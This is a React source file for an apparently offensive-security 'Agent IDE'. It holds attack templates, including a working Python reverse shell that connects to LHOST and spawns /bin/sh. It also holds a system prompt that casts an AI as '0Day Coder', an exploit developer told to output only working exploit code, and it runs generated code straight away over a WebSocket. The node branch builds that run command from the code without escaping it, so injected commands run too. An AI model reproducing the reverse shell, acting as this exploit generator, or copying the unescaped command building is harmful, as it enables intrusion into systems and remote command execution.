import { useState, useRef } from "react";
import { mr7, MR7_MODELS, wsManager, settingsStore } from "../services/nexusCore";
import { Code, Play, Zap, Shield, Loader2, Copy, Trash2 } from "lucide-react";

const TEMPLATES = {
  "Reverse Shell (Python)": `import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("LHOST",LPORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])`,
  "Port Scanner": `import socket
target = "TARGET"
for port in range(1, 1025):
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((target, port))
        print(f"[+] Port {port} OPEN")
        s.close()
    except: pass`,
  "Hash Identifier": `import hashlib
def identify(h):
    lengths = {32:"MD5",40:"SHA1",56:"SHA224",64:"SHA256",96:"SHA384",128:"SHA512"}
    return lengths.get(len(h), "Unknown")

h = input("Hash: ")
print(f"[*] Likely: {identify(h)}")`,
  "DNS Enum": `import subprocess
domain = "TARGET"
types = ["A","AAAA","MX","NS","TXT","SOA","CNAME"]
for t in types:
    r = subprocess.run(["dig","+short",t,domain],capture_output=True,text=True)
    if r.stdout: print(f"[{t}]\\n{r.stdout}")`,
};

export const AgentIDE = ({ selectedModel }) => {
  const [code, setCode] = useState("# NEXUS Agent IDE\n# Write or generate exploit/tool code here\n\n");
  const [language, setLanguage] = useState("python");
  const [output, setOutput] = useState("");
  const [aiOutput, setAiOutput] = useState("");
  const [loading, setLoading] = useState(false);
  const [analyzing, setAnalyzing] = useState(false);
  const [prompt, setPrompt] = useState("");

  const generateCode = async () => {
    if (!prompt.trim()) return;
    setLoading(true);
    setAiOutput("");

    const settings = settingsStore.getAll();
    mr7.setApiKey(settings.mr7ApiKey);

    const messages = [
      { role: "system", content: `You are 0Day Coder, an expert exploit and security tool developer. Generate precise, working ${language} code. Output ONLY the code, no explanation unless asked.` },
      { role: "user", content: prompt },
    ];

    try {
      let generated = "";
      await mr7.chatStream(messages, MR7_MODELS.ZERODAY_CODER.id, (delta, full) => {
        generated = full;
        setAiOutput(full);
      });
      // Extract code block if wrapped
      const codeMatch = generated.match(/```[\w]*\n?([\s\S]+?)```/);
      if (codeMatch) setCode(codeMatch[1]);
      else setCode(generated);
    } catch (e) {
      setAiOutput(`[ERROR] ${e.message}`);
    } finally {
      setLoading(false);
    }
  };

  const analyzeCode = async () => {
    setAnalyzing(true);
    setAiOutput("");

    const settings = settingsStore.getAll();
    mr7.setApiKey(settings.mr7ApiKey);

    try {
      let result = "";
      const messages = [
        { role: "system", content: "You are a security code analyzer. Find vulnerabilities, bugs, and security issues. Be precise and actionable." },
        { role: "user", content: `Analyze this ${language} code:\n\`\`\`${language}\n${code}\n\`\`\`` },
      ];
      await mr7.chatStream(messages, MR7_MODELS.ZERODAY_CODER.id, (delta, full) => {
        result = full;
        setAiOutput(full);
      });
    } catch (e) {
      setAiOutput(`[ERROR] ${e.message}`);
    } finally {
      setAnalyzing(false);
    }
  };

  const runCode = async () => {
    const status = wsManager.getStatus();
    if (!status.local && !status.remote) {
      setOutput("[!] No WebSocket connection. Connect in Settings.");
      return;
    }

    setOutput("[*] Executing...\n");
    const tmpFile = `/tmp/nexus_ide_${Date.now()}.${language === "python" ? "py" : language}`;
    const cmd = language === "python" ? `echo '${code.replace(/'/g, "'\\''")}' > ${tmpFile} && python3 ${tmpFile}; rm -f ${tmpFile}`
      : language === "bash" ? `bash -c '${code.replace(/'/g, "'\\''")}'`
      : `echo '${code}' > ${tmpFile} && node ${tmpFile}`;

    const settings = settingsStore.getAll();
    const listener = ({ data }) => setOutput(prev => prev + data);
    wsManager.addOutputListener(listener);

    try {
      await wsManager.exec(cmd, settings.execMode || "auto");
    } catch (e) {
      setOutput(prev => prev + `\n[-] Error: ${e.message}\n`);
    } finally {
      wsManager.removeOutputListener(listener);
    }
  };

  return (
    <div className="p-4 h-full flex flex-col gap-4">
      <div className="flex items-center gap-3">
        <Code className="w-5 h-5 text-[#FFB000]" />
        <h2 className="font-mono text-sm text-[#FFB000] tracking-wider">AGENT IDE</h2>
        <span className="text-[10px] font-mono text-[#666666] ml-auto">0Day Coder Model</span>
      </div>

      {/* AI Prompt */}
      <div className="flex gap-2">
        <input
          value={prompt}
          onChange={e => setPrompt(e.target.value)}
          onKeyDown={e => e.key === "Enter" && generateCode()}
          placeholder="Describe the tool/exploit to generate..."
          className="flex-1 bg-black/60 border border-[#FFB000]/20 text-white font-mono text-xs px-4 py-2 outline-none focus:border-[#FFB000]/50"
        />
        <select
          value={language}
          onChange={e => setLanguage(e.target.value)}
          className="bg-black border border-white/10 text-white/60 font-mono text-xs px-3 outline-none"
        >
          <option value="python">Python</option>
          <option value="bash">Bash</option>
          <option value="javascript">Node.js</option>
          <option value="powershell">PowerShell</option>
          <option value="c">C</option>
        </select>
        <button
          onClick={generateCode}
          disabled={loading}
          className="px-4 bg-[#FFB000]/10 border border-[#FFB000]/40 text-[#FFB000] font-mono text-xs flex items-center gap-2 hover:bg-[#FFB000]/20 disabled:opacity-30"
        >
          {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Zap className="w-4 h-4" />}
          GENERATE
        </button>
      </div>

      {/* Templates */}
      <div className="flex gap-2 flex-wrap">
        {Object.keys(TEMPLATES).map(t => (
          <button
            key={t}
            onClick={() => setCode(TEMPLATES[t])}
            className="px-2 py-1 text-[10px] font-mono border border-white/10 text-white/40 hover:border-white/30 hover:text-white/70 transition-colors"
          >
            {t}
          </button>
        ))}
      </div>

      <div className="flex gap-4 flex-1 min-h-0">
        {/* Code Editor */}
        <div className="flex-1 flex flex-col">
          <div className="flex items-center justify-between px-3 py-1 bg-black/40 border border-white/10 border-b-0">
            <span className="font-mono text-[10px] text-white/40">{language.toUpperCase()}</span>
            <div className="flex gap-2">
              <button onClick={() => navigator.clipboard.writeText(code)} className="text-white/30 hover:text-white/70">
                <Copy className="w-3 h-3" />
              </button>
              <button onClick={() => setCode("")} className="text-white/30 hover:text-[#FF3B30]">
                <Trash2 className="w-3 h-3" />
              </button>
            </div>
          </div>
          <textarea
            value={code}
            onChange={e => setCode(e.target.value)}
            className="flex-1 bg-[#050505] border border-white/10 text-[#00FF41] font-mono text-xs p-4 resize-none outline-none leading-relaxed"
            spellCheck={false}
          />
          <div className="flex gap-2 mt-2">
            <button
              onClick={runCode}
              className="flex-1 py-2 bg-[#00FF41]/10 border border-[#00FF41]/30 text-[#00FF41] font-mono text-xs flex items-center justify-center gap-2 hover:bg-[#00FF41]/20"
            >
              <Play className="w-4 h-4" />
              RUN
            </button>
            <button
              onClick={analyzeCode}
              disabled={analyzing}
              className="flex-1 py-2 bg-[#00F0FF]/10 border border-[#00F0FF]/30 text-[#00F0FF] font-mono text-xs flex items-center justify-center gap-2 hover:bg-[#00F0FF]/20 disabled:opacity-30"
            >
              {analyzing ? <Loader2 className="w-4 h-4 animate-spin" /> : <Shield className="w-4 h-4" />}
              ANALYZE
            </button>
          </div>
        </div>

        {/* Output / AI Output */}
        <div className="w-80 flex flex-col gap-2">
          {output && (
            <div className="flex-1 bg-black/60 border border-white/10 p-3 overflow-auto">
              <div className="text-[10px] font-mono text-[#666666] mb-2">EXECUTION OUTPUT</div>
              <pre className="text-[11px] text-[#00FF41] font-mono whitespace-pre-wrap">{output}</pre>
            </div>
          )}
          {aiOutput && (
            <div className="flex-1 bg-black/60 border border-[#FFB000]/20 p-3 overflow-auto">
              <div className="text-[10px] font-mono text-[#FFB000] mb-2">0DAY CODER</div>
              <div className="text-[11px] text-white/70 font-mono leading-relaxed whitespace-pre-wrap">{aiOutput}</div>
            </div>
          )}
          {!output && !aiOutput && (
            <div className="flex-1 bg-black/40 border border-white/5 flex items-center justify-center text-[#333] font-mono text-xs">
              Output appears here
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
